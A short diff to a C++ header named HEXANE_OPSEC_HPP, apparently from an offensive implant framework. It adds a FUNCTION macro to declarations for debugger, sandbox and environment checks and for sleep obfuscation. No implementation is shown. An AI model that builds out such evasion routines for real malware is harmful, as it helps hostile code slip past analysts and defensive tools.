@@ -4,11 +4,11 @@
 #include <core/include/commands.hpp>
 #include <core/include/utils.hpp>
 
-BOOL CheckTime ();
-VOID SeCheckDebugger();
-VOID SeCheckSandbox();
-VOID SeCheckEnvironment();
-VOID SeImageCheck(PIMAGE img, PIMAGE proc);
-VOID SleepObf();
+FUNCTION BOOL CheckTime ();
+FUNCTION VOID SeCheckDebugger();
+FUNCTION VOID SeCheckSandbox();
+FUNCTION VOID SeCheckEnvironment();
+FUNCTION VOID SeImageCheck(PIMAGE img, PIMAGE proc);
+FUNCTION VOID SleepObf();
 
 #endif //HEXANE_OPSEC_HPP
